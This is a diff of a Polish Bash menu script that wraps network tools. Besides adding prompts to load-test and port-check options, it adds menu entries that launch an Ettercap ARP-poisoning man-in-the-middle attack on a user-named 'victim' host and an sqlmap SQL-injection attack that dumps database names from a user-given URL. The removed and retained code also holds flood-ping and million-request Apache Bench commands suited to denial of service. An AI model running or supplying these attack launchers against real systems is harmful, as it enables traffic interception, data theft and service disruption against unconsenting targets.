@@ -9,59 +9,113 @@ show_menu() {
     echo "4. Sprawdzanie dostępności portów"
     echo "5. Analiza logów"
     echo "6. Testowanie prędkości łącza"
+    echo "7. Skanowanie podatności (Nmap)"
+    echo "8. Atak typu Man-in-the-Middle (Ettercap)"
+    echo "9. Atak typu SQL injection (SQLmap)"
     echo "0. Wyjście"
     read option
 }
 
 # Funkcja do uruchamiania testu Apache Bench
 run_ab_test() {
-    # Dodanie argumentu do wyboru celu testu
     echo "Wpisz adres URL strony do testowania:"
     read url
-    ab -n 1000000 -c 1000 -g ab_results.csv $url &
+    echo "Wpisz liczbę żądań:"
+    read num_requests
+    echo "Wpisz liczbę jednoczesnych połączeń:"
+    read concurrent_connections
+    echo "Wybierz format pliku wynikowego (CSV/JSON/HTML):"
+    read result_format
+    ab -n $num_requests -c $concurrent_connections -g ab_results.$result_format $url &
 }
 
 # Funkcja do uruchamiania testu ping
 run_ping_test() {
-    # Dodanie argumentu do wyboru celu testu
     echo "Wpisz adres IP lub nazwę hosta do pingowania:"
     read host
-    ping -f -c 65507 -s 65507 -i 0.001 $host &
+    echo "Wpisz rozmiar pakietów:"
+    read packet_size
+    echo "Wpisz interwał czasowy (w sekundach):"
+    read interval
+    echo "Wpisz liczbę powtórzeń:"
+    read num_iterations
+    ping -f -c $num_iterations -s $packet_size -i $interval $host &
 }
 
 # Funkcja do monitorowania wydajności sieciowej
 network_performance_monitor() {
     echo "Monitorowanie wydajności sieciowej:"
     echo "----------------------------------"
-    # Dodanie argumentu do wyboru serwera
     echo "Wpisz adres IP lub nazwę hosta serwera:"
     read server
-    iperf -c $server
+    echo "Wpisz parametry transmisji danych (np. -l 1000 -b 10M -t 10s):"
+    read transmission_params
+    iperf $transmission_params $server
 }
 
 # Funkcja do sprawdzania dostępności portów
 check_port_availability() {
-    # Dodanie argumentu do wyboru celu testu
     echo "Wpisz adres IP lub nazwę hosta do sprawdzania:"
     read host
-    echo "Sprawdzanie portu 80:"
-    nc -zv $host 80
-    echo "Sprawdzanie portu 443:"
-    nc -zv $host 443
+    echo "Wpisz początkowy port zakresu:"
+    read start_port
+    echo "Wpisz końcowy port zakresu:"
+    read end_port
+    echo "Wybierz protokół (TCP/UDP):"
+    read protocol
+    for ((port=start_port; port<=end_port; port++))
+    do
+        echo "Sprawdzanie portu $port:"
+        nc -zv $host $port $protocol
+    done
 }
 
 # Funkcja do analizy logów
 analyze_logs() {
     echo "Analiza logów:"
     echo "--------------"
-    # Dodanie kodu do analizy logów, generowania raportów itp.
+    # Tutaj dodaj kod do analizy logów, generowania raportów itp.
 }
 
 # Funkcja do testowania prędkości łącza
 speed_test() {
     echo "Testowanie prędkości łącza:"
     echo "---------------------------"
-    speedtest-cli --server 1234
+    echo "Wpisz numer serwera do testowania:"
+    read server_num
+    echo "Wybierz jednostkę prędkości (bps/Kbps/Mbps/Gbps):"
+    read speed_unit
+    speedtest-cli --server $server_num --unit $speed_unit
+}
+
+# Funkcja do skanowania podatności (Nmap)
+vulnerability_scan() {
+    echo "Skanowanie podatności (Nmap):"
+    echo "------------------------------"
+    echo "Wpisz adres IP lub nazwę hosta do skanowania:"
+    read target
+    echo "Uruchamianie skanowania..."
+    nmap $target
+}
+
+# Funkcja do ataku typu Man-in-the-Middle (Ettercap)
+man_in_the_middle_attack() {
+    echo "Atak typu Man-in-the-Middle (Ettercap):"
+    echo "----------------------------------------"
+    echo "Wpisz adres IP lub nazwę hosta ofiary:"
+    read victim
+    echo "Uruchamianie ataku..."
+    ettercap -T -q -M arp:remote /$victim/ // &
+}
+
+# Funkcja do ataku typu SQL injection (SQLmap)
+sql_injection_attack() {
+    echo "Atak typu SQL injection (SQLmap):"
+    echo "----------------------------------"
+    echo "Wpisz adres URL strony do ataku:"
+    read target_url
+    echo "Uruchamianie ataku..."
+    sqlmap -u $target_url --dbs
 }
 
 # Główna pętla programu
@@ -85,6 +139,15 @@ while true; do
         ;;
     6)
         speed_test
+        ;;
+    7)
+        vulnerability_scan
+        ;;
+    8)
+        man_in_the_middle_attack
+        ;;
+    9)
+        sql_injection_attack
         ;;
     0)
         echo "Wyjście z programu..."
